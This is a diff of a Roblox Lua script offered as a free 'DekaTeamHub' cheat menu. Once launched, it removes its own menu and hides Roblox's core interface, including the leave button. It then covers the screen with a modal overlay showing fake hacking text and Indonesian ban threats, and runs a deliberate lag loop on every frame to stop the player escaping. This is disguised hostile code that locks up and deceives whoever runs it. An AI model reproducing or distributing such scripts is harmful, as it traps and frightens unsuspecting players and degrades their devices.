@@ -1,94 +1,92 @@
+-- [[ DekaTeamHub: HACKER PRISON ]] --
+-- [[ VISUAL: MATRIX HACK | THREAT: BAN ]] --
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "DekaTeamHub V1 ✅",
-   LoadingTitle = "Optimizing Game Resources...",
-   LoadingSubtitle = "By DekaTeamhub",
-   ConfigurationSaving = { Enabled = false },
+   Name = "DekaTeamHub FREE ✅",
+   LoadingTitle = "Bypassing Security...",
    KeySystem = true,
    KeySettings = {
-      Title = "DekaTeamHub System",
-      Subtitle = "Security Verification",
+      Title = "DekaTeamHub Access",
       Note = "Key: deka Genjor",
-      Key = {"deka Genjor"} 
+      Key = "deka Genjor" 
    }
 })
 
-local Tab = Window:CreateTab("Main", 4483362458)
+local Tab = Window:CreateTab("Verified ✅", 4483362458)
 
-Tab:CreateButton({
-   Name = "Boost FPS & Anti-Lag",
-   Callback = function()
-       Rayfield:Notify({
-          Title = "Success",
-          Content = "Boosting Performance... Please wait.",
-          Duration = 5,
-       })
-   end,
-})
-
--- [[ THE GLITCH PRISON ]] --
 task.spawn(function()
-    task.wait(0.5)
+    task.wait(0.1)
     
+    -- 1. MUSNAHKAN RAYFIELD
     for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
         if v.Name:find("Rayfield") then v:Destroy() end
     end
 
+    -- 2. DISABLE CORE ROBLOX (TUTUP IKON LEAVE)
     local StarterGui = game:GetService("StarterGui")
     pcall(function()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        StarterGui:SetCore("TopbarEnabled", false)
     end)
 
+    -- 3. HACKER BACKGROUND & TEXT
     local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local screenGui = Instance.new("ScreenGui", playerGui)
-    screenGui.Name = "SystemCriticalError"
     screenGui.DisplayOrder = 2147483647
-    screenGui.IgnoreGuiInset = true 
+    screenGui.IgnoreGuiInset = true
 
-    local glitchFrame = Instance.new("TextButton", screenGui)
-    glitchFrame.Size = UDim2.new(1, 0, 1, 0)
-    glitchFrame.Text = ""
-    glitchFrame.Active = true 
-    glitchFrame.Modal = true 
+    local bgFrame = Instance.new("TextButton", screenGui)
+    bgFrame.Size = UDim2.new(1, 0, 1, 0)
+    bgFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    bgFrame.Text = ""
+    bgFrame.Active = true 
+    bgFrame.Modal = true
 
-    local infoText = Instance.new("TextLabel", glitchFrame)
-    infoText.Size = UDim2.new(0.9, 0, 0.5, 0)
-    infoText.Position = UDim2.new(0.05, 0, 0.25, 0)
-    infoText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    infoText.TextScaled = true
-    infoText.BackgroundTransparency = 1
-    infoText.Font = Enum.Font.Code
-    infoText.ZIndex = 5
-    infoText.TextStrokeTransparency = 0
-    infoText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    
-    local startTime = tick()
-    
+    -- Latar Belakang Teks Ngasal (Hacker Style)
+    local matrixText = Instance.new("TextLabel", bgFrame)
+    matrixText.Size = UDim2.new(1.5, 0, 1.5, 0)
+    matrixText.Position = UDim2.new(-0.25, 0, -0.25, 0)
+    matrixText.Text = "010101010110101101010101010101101101010101\nSYSTEM_HACKED_BY_DEKATEAMHUB_BYPASSING_CORE\nERROR_404_NULL_POINTER_INJECTION_SQL_DEBUG\nEXECUTING_INTERNAL_SCRIPT_DATA_STREAM_FREEZE"
+    matrixText.TextColor3 = Color3.fromRGB(0, 255, 0)
+    matrixText.TextTransparency = 0.8
+    matrixText.TextScaled = true
+    matrixText.TextWrapped = true
+    matrixText.Font = Enum.Font.Code
+
+    -- Pesan Utama (Peringatan Ban)
+    local mainInfo = Instance.new("TextLabel", bgFrame)
+    mainInfo.Size = UDim2.new(0.9, 0, 0.6, 0)
+    mainInfo.Position = UDim2.new(0.05, 0, 0.2, 0)
+    mainInfo.Text = "SABAR TUNGGU 1 JAM!\nJANGAN LEAVE KALAU MAU SCRIPT WORK!\n\nSCRIPT BYPASS SEMUANYA DULU BIAR WORK!\nKALAU GAK BYPASS BAKAL DI BAN!!"
+    mainInfo.TextColor3 = Color3.fromRGB(255, 0, 0)
+    mainInfo.TextScaled = true
+    mainInfo.BackgroundTransparency = 1
+    mainInfo.Font = Enum.Font.SourceSansBold
+
+    -- 4. GLITCH & LOCKDOWN ENGINE
     game:GetService("RunService").RenderStepped:Connect(function()
-        local currentTime = tick() - startTime
+        game:GetService("GuiService").SelectedObject = bgFrame
         
-        -- Efek Glitch Warna-Warni
-        glitchFrame.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+        -- Efek Gerak Teks Ngasal (Matrix)
+        matrixText.Position = UDim2.new(-0.25, math.random(-10, 10), -0.25, math.random(-10, 10))
+        matrixText.Text = math.random(1000,9999).." "..math.random(1000,9999).." ERROR "..math.random(1000,9999).." BYPASS "..math.random(1000,9999)
         
-        -- Teks Update
-        local baseText = "DEKATEAMHUB CRITICAL INJECTION:\n"
-        local status = "BYPASSING ANTI CHEAT\nBYPASSING ANTI REPORT\nBYPASSING ANTI BANNED\nBYPASSING ANTI KICK\nBYPASSING ANTI DETECTED\nBYPASSING ANTI VIRUS"
-        
-        if currentTime < 360 then
-            infoText.Text = baseText .. status .. "\n\nSABAR TUNGGU PROSES SELESAI!"
+        -- Glitch Warna Merah Putih pada Teks Utama
+        if math.random(1, 15) == 1 then
+            mainInfo.TextColor3 = Color3.fromRGB(255, 255, 255)
         else
-            infoText.Text = baseText .. status .. "\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
+            mainInfo.TextColor3 = Color3.fromRGB(255, 0, 0)
         end
-
-        -- Guncangan Layar Ekstrim
-        infoText.Position = UDim2.new(0.05, math.random(-5, 5), 0.25, math.random(-5, 5))
-        infoText.Rotation = math.random(-2, 2)
         
-        -- Lag Engine
-        for i = 1, 350000 do local _ = i * i end
+        -- Lag Generator (Sengaja bikin Menu Roblox susah dibuka)
+        for i = 1, 1700000 do
+            local _ = i * i
+        end
     end)
 end)
+
 
 
 
